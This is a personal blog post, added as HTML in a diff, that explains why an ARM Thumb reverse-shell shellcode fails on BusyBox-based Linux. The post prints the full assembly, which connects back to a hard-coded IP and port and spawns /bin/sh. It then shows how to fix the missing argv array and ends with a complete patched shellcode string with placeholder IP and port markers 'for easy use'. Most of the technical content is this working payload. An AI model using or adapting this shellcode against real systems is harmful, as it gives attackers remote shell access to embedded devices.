@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.27.1" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="//fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/rainbow.min.css">
+<link rel="stylesheet" href="/css/normalize.css">
+<link rel="stylesheet" href="/css/skeleton.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="alternate" href="/index.xml" type="application/rss+xml" title="slashd.ga">
+<title>Why Shellcode Doesn&#39;t Work on BusyBox - slashd.ga</title>
+</head>
+<body>
+
+<div class="container">
+
+	<header role="banner">
+		<div class="header-logo">
+			<a href="/"><img src="/images/logo.png" width="60" height="60" alt="slashd.ga"></a>
+		</div>
+		
+	</header>
+
+
+	<main role="main">
+	<article itemscope itemtype="http://schema.org/BlogPosting"> 
+			<h1 class="entry-title" itemprop="headline">Why Shellcode Doesn&#39;t Work on BusyBox</h1>
+			<span class="entry-meta"><time itemprop="datePublished" datetime="2018-08-06">August 06, 2018</time></span>
+			
+
+<h1 id="why-shellcode-doesn-t-work-on-busybox">Why shellcode doesn&rsquo;t work on busybox</h1>
+
+<hr />
+
+<h2 id="is-bad-shellcode">Is bad shellcode?</h2>
+
+<p>I had a problem when was testing back-connect shellcode for ARM platform. I took
+shellcode from <a href="https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit/">Azeria Lab</a> and he didn&rsquo;t work correctly. I had back-connect, but without any command execution.
+I was testing shellcode on Linux with <a href="https://en.wikipedia.org/wiki/BusyBox">BusyBox</a>. Simply, <code>/bin/sh</code> is the link to
+<code>/bin/busybox</code>. So when I execute <code>/bin/sh</code>, instead starting <code>/bin/busybox</code> and determine which utily i run and execute it. Another interesting point: when i tried debugging shellcode - he was crashing with SIGSEGV after calling execve syscall.</p>
+
+<h2 id="how-does-busybox-determine-which-command-run">How does BusyBox determine which command run?</h2>
+
+<p>For testing write small program:</p>
+
+<pre><code class="language-C">int main(int argc, char **argv)
+{
+    printf(&quot;argv[0]: %s\n&quot;, argv[0]);
+    return 0;
+}
+</code></pre>
+
+<p>Then compile and run:</p>
+
+<pre><code class="language-bash">$ gcc test.c -o test
+$ ./test
+argv[0]: ./test
+</code></pre>
+
+<p>Try create link to test and run test from link:</p>
+
+<pre><code class="language-bash">$ ln -s test ./not_test
+$ ./not_test
+argv[0]: ./not_test
+</code></pre>
+
+<p>So, when we run program, command processor (bash or busybox) execute syscall <code>execve</code> and set <code>argv[0]</code> to the program name. Then, if we execute command in BusyBox ecosystem, BusyBox analysing <code>argv[0]</code> and execute correspond command.</p>
+
+<h2 id="how-does-shellcode-execute-bin-sh">How does shellcode execute <code>/bin/sh</code>?</h2>
+
+<p>Shellcode assembler listing from <a href="https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit/">Azeria Lab</a>:</p>
+
+<pre><code class="language-asm">.section .text
+.global _start
+_start:
+ .ARM
+ \x01\x30\x8f\xe2               add   r3, pc, #1       // switch to thumb mode
+ \x13\xff\x2f\xe1               bx    r3
+
+.THUMB
+// socket(2, 1, 0)
+ \x02\x20                       mov   r0, #2
+ \x01\x21                       mov   r1, #1
+ \x92\x1a                       sub   r2, r2
+
+ \xc8\x27                       mov   r7, #200
+ \x51\x37                       add   r7, #81         // r7 = 281 (socket)
+ \x01\xdf                       svc   #1              // r0 = resultant sockfd
+ \x04\x1c                       mov   r4, r0          // save sockfd in r4
+
+// connect(r0, &amp;sockaddr, 16)
+ \x0a\xa1                       adr   r1, struct        // pointer to address, port
+ \x4a\x70                       strb  r2, [r1, #1]    // write 0 for AF_INET
+ \x10\x22                       mov   r2, #16
+ \x02\x37                       add   r7, #2          // r7 = 283 (connect)
+ \x01\xdf                       svc   #1
+
+// dup2(sockfd, 0)
+ \x3f\x27                       mov   r7, #63         // r7 = 63 (dup2)
+ \x20\x1c                       mov   r0, r4          // r4 is the saved sockfd
+ \x49\x1a                       sub   r1, r1          // r1 = 0 (stdin)
+ \x01\xdf                       svc   #1
+// dup2(sockfd, 1)
+ \x20\x1c                       mov   r0, r4          // r4 is the saved sockfd
+ \x01\x21                       mov   r1, #1          // r1 = 1 (stdout)
+ \x01\xdf                       svc   #1
+// dup2(sockfd, 2)
+ \x20\x1c                       mov   r0, r4         // r4 is the saved sockfd
+ \x02\x21                       mov   r1, #2         // r1 = 2 (stderr)
+ \x01\xdf                       svc   #1
+
+// execve(&quot;/bin/sh&quot;, 0, 0)
+ \x04\xa0                       adr   r0, binsh
+ \x52\x40                       sub   r2, r2
+ \x49\x40                       sub   r1, r1
+ \xc2\x71                       strb  r2, [r0, #7]
+ \x0b\x27                       mov   r7, #11       // r7 = 11 (execve)
+ \x01\xdf                       svc   #1
+struct:
+.ascii &quot;\x02\xff&quot;      // AF_INET 0xff will be NULLed
+.ascii &quot;\x11\x5c&quot;      // port number 4444
+.byte 192,168,139,130  // IP Address
+binsh:
+.ascii &quot;/bin/shX&quot;
+</code></pre>
+
+<p>Syscall <code>execve</code> calling without passing <code>argv</code> array, thus BusyBox can&rsquo;t determine which program need to call. For correct shellcode working we should define array <code>argv</code> and pass them to the <code>execve</code> syscall.</p>
+
+<h2 id="shellcode-modification">Shellcode modification</h2>
+
+<p>I use <a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">online assembler/disassembler</a>. Throw out first 8 bytes from shellcode (because there are 2 instructions used to switch to the thumb-mode) and decompile in &ldquo;ARM (thumb)&rdquo; mode.</p>
+
+<pre><code class="language-asm">0x0000:    \x02\x20    movs r0, #2
+0x0002:    \x01\x21    movs r1, #1
+0x0004:    \x92\x1a    subs r2, r2, r2
+0x0006:    \xc8\x27    movs r7, #0xc8
+0x0008:    \x51\x37    adds r7, #0x51
+0x000a:    \x01\xdf    svc #1
+0x000c:    \x04\x1c    adds r4, r0, #0
+0x000e:    \x0a\xa1    adr r1, #0x28
+0x0010:    \x4a\x70    strb r2, [r1, #1]
+0x0012:    \x10\x22    movs r2, #0x10
+0x0014:    \x02\x37    adds r7, #2
+0x0016:    \x01\xdf    svc #1
+0x0018:    \x3f\x27    movs r7, #0x3f
+0x001a:    \x20\x1c    adds r0, r4, #0
+0x001c:    \x49\x1a    subs r1, r1, r1
+0x001e:    \x01\xdf    svc #1
+0x0020:    \x20\x1c    adds r0, r4, #0
+0x0022:    \x01\x21    movs r1, #1
+0x0024:    \x01\xdf    svc #1
+0x0026:    \x20\x1c    adds r0, r4, #0
+0x0028:    \x02\x21    movs r1, #2
+0x002a:    \x01\xdf    svc #1
+0x002c:    \x04\xa0    adr r0, #0x10
+0x002e:    \x52\x40    eors r2, r2
+0x0030:    \x49\x40    eors r1, r1
+0x0032:    \xc2\x71    strb r2, [r0, #7]
+0x0034:    \x0b\x27    movs r7, #0xb
+0x0036:    \x01\xdf    svc #1
+</code></pre>
+
+<p>Create array <code>argv</code> on the stack, bacause integrity of the stack after <code>execve</code> syscall doesn&rsquo;t matter. Write next ARM-thumb assembly code after offset 0x30 in the shellcode:</p>
+
+<pre><code class="language-asm">// Write null to argv[0]
+str r1, [sp, #4] 
+// Write null to argv[1], end marker
+str r1, [sp, #8]
+// Write address of '/bin/bash' string to argv[0]
+str r0, [sp, #4]
+// Set r0 to the pointer of argv
+add r1, sp, #4
+</code></pre>
+
+<p>With online assembler (see above) translate instruction to binary view.</p>
+
+<p>But it doesn&rsquo;t end. Since, we added instruction before data, so we must edit the arguments in 2 <code>adr</code> instructions (offsets <code>0x000e</code> and <code>0x002c</code>). Offset to data incarsed by 8 bytes, thus we should incement by 2 arg in binary view (<code>2*4=8</code>). Replace instructions from:</p>
+
+<pre><code class="language-asm">0x000e:    \x0a\xa1    adr r1, #0x28
+0x002c:    \x04\xa0    adr r0, #0x10
+</code></pre>
+
+<p>to:</p>
+
+<pre><code class="language-asm">0x000e:    \x0c\xa1    adr r1, #0x30
+0x002c:    \x06\xa0    adr r0, #0x18
+</code></pre>
+
+<h2 id="the-final-shellcode">The final shellcode</h2>
+
+<p>For easy use i replace port to <code>\x42\x42</code> mark and IP-address to <code>\x41\x41\x41\x41</code> mark:</p>
+
+<pre><code class="language-bash">sc = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0c\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x06\xa0\x52\x40\x49\x40\x01\x91\x02\x91\x01\x90\x01\xa9\xc2\x71\x0b\x27\x01\xdf\x02\xff\x42\x42\x41\x41\x41\x41\x2f\x62\x69\x6e\x2f\x73\x68\x58\x00'
+</code></pre>
+
+	</article>
+	</main>
+
+
+	<footer role="contentinfo">
+		<div class="hr"></div>
+		<div class="footer-container">
+			<div class="copyright">Valentin Shilnenkov</div>
+			<div class="footer-link">
+				
+				  <a href="mailto:need.coffee@yandex.ru"><img class="icon" src="/images/email.svg"/ alt="email"></a>
+				
+				
+				
+				
+				  <a href="https://github.com/nixerr/" target="_blank"><img class="icon" src="/images/github.svg"/></a>
+				
+				
+			</div>
+		</div>
+	</footer>
+
+</div>
+
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/cmake.min.js" defer></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js" defer></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js" defer></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/cpp.min.js" defer></script>
+  
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+</body>
+</html>
+
